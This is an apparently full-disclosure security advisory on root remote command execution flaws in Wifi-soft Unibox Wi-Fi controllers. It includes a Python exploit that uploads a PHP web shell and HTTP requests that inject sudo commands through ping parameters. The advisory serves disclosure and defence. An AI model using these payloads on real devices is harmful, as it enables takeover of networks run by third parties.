---
layout: post
title:  "[0-day] Multiple Root RCE in Unibox Wifi Access Controller 0.x - 3.x"
tagline: Wifi-soft Unibox Controller Vulnerability Report
tag: advisory
excerpt_separator: <!--more-->

---

In this post, I will be disclosing POCs for multiple Remote Command & Code injection vulnerabilities found in Wifi-soft's Unibox Controllers. The vulnerabilities allows an attacker to gain root privileges on the system and affects all versions of Wifi-soft's Unibox Controllers. As there was no response from Wifi-soft team with-in and after 90 days disclosure timeline, I am going with full disclosure. So that people using these devices know the risk they are putting their infrastructure upto.<!--more-->
Following map shows the approximate number of devices affected globally:

![map](/assets/images/unibox/map.png)

### Product Description
[Unibox Controller][0] is a fast-paced, reliable and scalable network controller for all Large & Small venues. It can be installed in any public venue like hotels, cafes, schools/colleges, hospitals, shopping malls, travel venues and even private offices to control, manage and monitor Internet access.

It is designed to work with access points from any vendor and is extremely easy to configure and deploy in the network. It comes in different models ranging from 50 to 5,000 concurrent users so it can be deployed to manage a network of any scale. UniBox works seamlessly with UniMax access points making it really easy to deploy and manage these access points centrally from a single console.

### Affected Versions : 0.x - 3.x
### Vulnerable Instances:

#### Unibox 0.x - 2.x 

* /network/mesh/edit-nds.php, **[POST] file CVE-2019-3495**
* /tools/ping **[POST] address CVE-2019-3497**

#### Unibox 3.x
* /tools/controller/diagnostic_tools_controller, **[POST] pingIPAddress CVE-2019-3496**

### Proof of Concept:

**Note:** *All session IDs and cookies are omitted to limit the damage, any credentials required to exploit the mention vulnerabilities are hardcoded and can be obtained without any sort of authentication as well (O yea, more vulns are still there and yes they have default admin credentials). If product owners are reading this and are concerned about the credibility of POCs, you can put a comment here and I can share the exploit with credentials, but I don't think that would be required anyway.*


### POC Exploit - CVE-2019-3495

```python
#!/usr/bin/env python

# Exploit Author: Sahil Dhar (Twitter: @0x401)
# Desc: Unibox 2.x Remote Command Execution via Arbitrary file upload Exploit

import requests
import sys
import argparse
import os
import re
import string

from random import sample, randint

filename = ''.join(sample(string.ascii_letters, randint(5,15)))+'.php'

def gen_stagers():
	payload = "<?php echo shell_exec(\"sudo /usr/local/unibox-0.9/scripts/exeCommand.sh '\".$_REQUEST['c'].\"'\"); ?>"
	return payload


def exploit(rhost):
	cookie = {'user': 'unibox', 'pass':'md5(hardcoded_value)'}	
	multipart_data = {
		'sent': (None,'Save Page or Upload File'),
		'file' : (filename,"%s" %(gen_stagers())),
		'contents': (None,'<h1>Welcome to my network</h1>\n<a href="$authtarget">Login to my network!</a>')
	}
	headers = {
	'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
	'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
	'Accept-Language': 'en-GB,en;q=0.5'

	}
	url = "http://%s/network/mesh/edit-nds.php" %(rhost)
	response = requests.post(url,
					files=multipart_data,
					verify=False,
					cookies=cookie,
					headers=headers,
					proxies=proxies
				)
	data = response.text
	payload =  re.findall(r'<sc.*>.*\:\\n(.*?)\"\);<\/sc.*>',data)[0]
	print "[I] Payload Url \nUrl: %s\n" %(payload)
	response = requests.get(payload+'?c=id')
	print response.text	
	print "[I] Done"

if __name__=='__main__':
	print 'Unibox 2.x Remote Command Execution via Arbitrary file upload\n'
	if len(sys.argv) < 1:
		print 'Missing rhost'
		os._exit(1)
	exploit(sys.argv[1])
```
![poc_2](/assets/images/unibox/2.png)


### POC - CVE-2019-3497

```markdown
POST /tools/ping HTTP/1.1
Host: unibox_0.x_2.x
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 86
Cookie: PHPSESSID=<obtained_via_hardcoded_credentials>
Connection: close
Upgrade-Insecure-Requests: 1

pingaction=1&address=127.0.0.1%0asudo /usr/local/unibox-0.9/scripts/exeCommand.sh%20id
```

![poc_1](/assets/images/unibox/1.png)


### POC - CVE-2019-3496

```markdown
POST /tools/controller/diagnostic_tools_controller HTTP/1.1
Host: unibox_3.x
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Cookie: PHPSESSID=<obtained_via_hardcoded_credentials>
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 87

action=ping&pingIPAddress=127.0.0.1%0asudo /usr/local/unibox/scripts/exeCommand.sh%20id
```

![poc_3](/assets/images/unibox/3.png)

[0]: http://wifi-soft.com/unibox-controller/

### Vendor Response Timeline
* **4/10/2018** - Sent inital email. - No response
* **12/10/2018** - Sent an email, included CEO's, CTO's and any other support/marketting email address I can find to discuss about the vulnerability. - No response
* **31/12/2018** - Sent another email via their online contact form. - No response
* **5/1/2019** - Public Disclosure :)